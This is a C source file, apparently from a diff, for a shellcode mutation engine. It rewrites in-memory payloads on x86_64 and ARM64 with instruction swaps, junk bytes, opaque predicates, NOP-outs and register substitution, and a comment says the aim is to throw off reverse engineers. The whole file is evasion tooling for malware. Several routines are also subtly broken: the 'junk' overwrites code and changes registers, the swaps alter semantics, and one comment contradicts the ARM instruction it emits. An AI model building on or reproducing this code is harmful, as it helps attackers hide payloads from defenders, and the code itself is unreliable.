/*
+ * File:        engine.c
+ *   Implements runtime mutation and obfuscation routines for in-memory
+ *   shellcode on x86_64 and ARM64. capabilities:
+ *     – Instruction validation (it_op, it_chunk)
+ *     – Instruction-length calculation (snap_instr_len)
+ *     – Simple transformations (swap, insert_junk, opaque predicates)
+ *     – High-level mutation driver (_mut8) and public entry point (mutate)
+ *
+ * Dependencies:
+ *   – decode_x86 / decode_arm64 from <decoder.h>
+ *   – ChaCha20 PRNG helpers for randomness (chacha20_random)
+ *
+ * Usage:
+ *   Call `mutate(buffer, size, rng)` after the first STUB_SIZE bytes
+ *   to apply randomized instruction-level obfuscations.
+ *
+ * Notes:
+ *   – (very simple)
+ */
    #include <wisp.h>
    #include <decoder.h>

/*-------------------------------------------
   Interface
-------------------------------------------*/

bool it_op(const uint8_t *code) {
#if defined(ARCH_X86)
    x86_instruction_t inst;
    if (!decode_x86(code, 0, &inst, NULL)) return false;
    if (inst.privileged) return false;
    return inst.valid;
#elif defined(ARCH_ARM)
    arm64_inst_t inst;
    if (!decode_arm64(code, &inst)) return false;
    if (inst.privileged) return false;
    return inst.valid;
#else
    return false;
#endif
}

bool it_chunk(const uint8_t *code, size_t max_len) {
    size_t offset = 0;
    while (offset < max_len) {
        size_t len = snap_instr_len(code + offset);
        if (len == 0 || offset + len > max_len) return false;
        if (!it_op(code + offset)) return false;
        offset += len;
    }
    return offset == max_len;
}

size_t snap_instr_len(const uint8_t *code) {
#if defined(ARCH_X86)
    x86_instruction_t inst;
    return decode_x86(code, 0, &inst, NULL) ? inst.len : 0;
#elif defined(ARCH_ARM)
    arm64_inst_t inst;
    if (decode_arm64(code, &inst)) {
        return 4;
    }
    return 0;
#else
    return 0;
#endif
}

void swap(uint8_t *code, size_t size, chacha_state_t *rng) {
    if (size < 16) return;
    
    uint8_t backup[size];
    memcpy(backup, code, size);

    for (int attempts = 0; attempts < 5; attempts++) {
        size_t i_offset = chacha20_random(rng) % size;
        size_t j_offset = chacha20_random(rng) % size;

        if (i_offset == j_offset) continue;

        size_t i_len = snap_instr_len(code + i_offset);
        size_t j_len = snap_instr_len(code + j_offset);

        if (i_len > 0 && j_len > 0 && i_len == j_len &&
            i_offset + i_len <= size && j_offset + j_len <= size) {
            // Perform swap
            uint8_t temp[16];
            memcpy(temp, code + i_offset, i_len);
            memcpy(code + i_offset, code + j_offset, i_len);
            memcpy(code + j_offset, temp, i_len);

            // Validate after swap
            if (it_chunk(code + i_offset, i_len) &&
                it_chunk(code + j_offset, j_len)) {
                return; // Success
            } else {
                // Revert if invalid
                memcpy(code, backup, size);
            }
        }
    }
}

#if defined(ARCH_X86)
const uint8_t x86_junk[][16] = {
    {0x48, 0x89, 0xC0},                // mov rax,rax
    {0x48, 0x83, 0xE0, 0x00},         // and rax,0
    {0x48, 0x83, 0xC8, 0xFF},         // or rax,-1
    {0x48, 0x31, 0xC0},                // xor rax,rax
    {0x90, 0x90, 0x90, 0x90},         // NOP sled
    {0x48, 0x87, 0xC9, 0x48, 0x87, 0xD2}  // xchg rcx,rcx; xchg rdx,rdx
};
#elif defined(ARCH_ARM)
const uint8_t arm_junk[][8] = {
    {0x1F, 0x20, 0x03, 0xD5},         // nop
    {0xE0, 0x03, 0x00, 0xAA},         // mov x0,x0
    {0xFF, 0x03, 0x00, 0xD1},         // sub sp,sp,#0
    {0x1F, 0x20, 0x03, 0xD5, 0x1F, 0x20, 0x03, 0xD5} // double nop
};
#endif

void insert_junk(uint8_t *code, size_t size, chacha_state_t *rng) {
    if (size < 16) return;

    size_t position = chacha20_random(rng) % (size - 16);
    uint8_t original[16];
    memcpy(original, code + position, 16);

#if defined(ARCH_X86)
    uint8_t junk[16];
    size_t junk_size = 3 + (chacha20_random(rng) % 10);
    memcpy(junk, x86_junk[chacha20_random(rng) % 6], junk_size);
#elif defined(ARCH_ARM)
    uint8_t junk[8];
    size_t junk_size = 4 + (chacha20_random(rng) % 4);
    memcpy(junk, arm_junk[chacha20_random(rng) % 4], junk_size);
#endif

    // Insert junk and validate
    memcpy(code + position, junk, junk_size);
    if (!it_chunk(code + position, junk_size)) {
        memcpy(code + position, original, 16);
    }
}

void Opaque(uint8_t *buf, size_t *len, uint32_t value) {
    // Very simple and predictable, but can throw the shit out of junior revs.
#if defined(ARCH_X86)
    // XOR + TEST + JZ (always taken)
    buf[0] = 0x48; buf[1] = 0x31; buf[2] = 0xC0; // xor rax,rax
    buf[3] = 0x48; buf[4] = 0x85; buf[5] = 0xC0; // test rax,rax
    buf[6] = 0x0F; buf[7] = 0x84;                // jz
    *(uint32_t*)(buf+8) = 0x00000000;            // 0 offset
    *len = 12;
#elif defined(ARCH_ARM)
    // MOV + CBNZ (never taken)
    *(uint32_t*)buf = 0xD2800000;                // mov x0,#0
    *(uint32_t*)(buf+4) = 0xB4000000 |          // cbz x0,0
                         ((4 << 5) & 0x00FFFFE0);
    *len = 8;
#endif
}

void _mut8(uint8_t *code, size_t size, chacha_state_t *rng) {
    // It just won't cut it!!!!
    uint8_t original[size];
    memcpy(original, code, size);
    size_t passes = 3 + (chacha20_random(rng) % 3);
    for (size_t i = 0; i < passes; i++) {
        uint8_t strategy = chacha20_random(rng) % 5;

        switch (strategy) {
            case 0: // Swap instructions
                swap(code, size, rng);
                break;

            case 1: // Insert junk
                insert_junk(code, size, rng);
                break;

            case 2: { // Insert opaque predicate
                    uint8_t opaque[16];
                    size_t olen;
                    Opaque(opaque, &olen, chacha20_random(rng));
                    if (olen <= size) {
                        size_t pos = chacha20_random(rng) % (size - olen);
                        uint8_t backup[16];
                        memcpy(backup, code + pos, olen);
                        memcpy(code + pos, opaque, olen);
                        if (!it_chunk(code + pos, olen)) {
                            memcpy(code + pos, backup, olen);
                        }
                    }
                    break;
                }

            case 3: { // NOP out instructions
                    size_t pos = chacha20_random(rng) % size;
                    size_t ilen = snap_instr_len(code + pos);
                    if (ilen > 0 && pos + ilen <= size) {
                        uint8_t backup[16];
                        memcpy(backup, code + pos, ilen);
#if defined(ARCH_X86)
                        memset(code + pos, 0x90, ilen); // NOP
#elif defined(ARCH_ARM)
                        *(uint32_t*)(code + pos) = 0xD503201F; // NOP
#endif
                        if (!it_chunk(code + pos, ilen)) {
                            memcpy(code + pos, backup, ilen);
                        }
                    }
                    break;
                }

            case 4: // Register substitution (x86 only)
#if defined(ARCH_X86)
                if (size >= 8) {
                    size_t pos = chacha20_random(rng) % (size - 8);
                    x86_instruction_t inst;
                    if (decode_x86(code + pos, 0, &inst, NULL) && inst.len >= 2) {
                        uint8_t modrm = code[pos + 1];
                        uint8_t new_reg_src = chacha20_random(rng) % 8;
                        uint8_t new_reg_dst = chacha20_random(rng) % 8;
                        uint8_t new_modrm = (modrm & 0xC0) | (new_reg_src << 3) | new_reg_dst;
                        code[pos + 1] = new_modrm;

                        if (!it_chunk(code + pos, inst.len)) {
                            code[pos + 1] = modrm; // Revert if invalid
                        }
                    }
                }
#endif
                break;
        }
    }

    // Final validation
    if (!it_chunk(code, size)) {
        memcpy(code, original, size);
    }
}

void mutate(uint8_t *code, size_t size, chacha_state_t *rng) {
    if (size <= STUB_SIZE) return;
    uint8_t *target = code + STUB_SIZE;
    size_t target_size = size - STUB_SIZE;
#ifdef MUTATE
    _mut8(target, target_size, rng);  
#endif
}